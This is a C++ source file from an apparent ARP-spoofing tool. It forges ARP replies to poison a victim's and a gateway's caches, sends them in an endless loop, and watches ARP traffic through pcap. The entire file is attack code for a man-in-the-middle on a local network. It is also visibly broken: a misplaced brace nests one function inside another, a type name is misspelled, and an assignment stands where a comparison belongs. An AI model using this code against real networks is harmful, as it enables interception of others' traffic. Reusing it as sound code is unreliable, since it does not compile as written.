/*
 * Spoofer.cpp
 *
 *  Created on: Apr 7, 2015
 *      Author: Felipe Rodopoulos
 */

#include "Spoofer.h"

Spoofer::Spoofer() {

}

Spoofer::~Spoofer() {

}

void Spoofer::spoof(){
	// Poisoned frame to victim
	Crafter toVictim(Globals::iface);
	toVictim.arp(
		ARPOP_REPLY,
		Globals::attacker.mac->ether_addr_octet, Globals::gateway.ip,
		Globals::victim.mac->ether_addr_octet, Globals::victim.ip
	);
	toVictim.ethernet(
		ETHERTYPE_ARP,
		Globals::gateway.mac->ether_addr_octet,
		Globals::victim.mac->ether_addr_octet
	);

	// Poisoned frame to gateway
	Crafter toGateway(Globals::iface);
	toGateway.arp(ARPOP_REPLY, Globals::attacker.mac->ether_addr_octet, Globals::victim.ip, Globals::gateway.mac->ether_addr_octet, Globals::gateway.ip);
	toGateway.ethernet(ETHERTYPE_ARP, Globals::victim.mac->ether_addr_octet, Globals::gateway.mac->ether_addr_octet);

	Sniffer sniffer("arp");

	// TODO Init thread
	while(true){
		sniffer.listen(spoofBack);

		toVictim.send();
		toGateway.send();
	}

void Spoofer::spoofBack(u_char* args, const struct pcap_pkthdr* header, const unsigned char* packet){
	pcap_t* pcapContext = (pcat_t*) args;
	Ethernet ether((unsigned char*) packet);

	if(ether.ptype = ETHERTYPE_ARP){
		ARP arp((unsigned char*) packet);

		/* Se algumas das vitimas manda um ARP Reply valido (sem o MAC do atacante como sender) */
		if(arp.arpOp == ARPOP_REPLY){
			if((arp.spaddr == Globals::victim.ip || arp.spaddr == Globals::gateway.ip)
			   && memcmp(arp.shaddr, Globals::attacker.mac->ether_addr_octet,6)){
				pcap_close(pcapContext);
			}

		/* Se alguem manda um ARP Request perguntando quem é uma das vítimas */
		} else if (arp.arpOp == ARPOP_REQUEST){
			if((arp.spaddr == Globals::victim.ip || arp.spaddr == Globals::gateway.ip)
			  && !memcmp(arp.shaddr, Globals::attacker.mac->ether_addr_octet, 6)){
				pcap_close(pcapContext);
			}
		}
	}
}

}
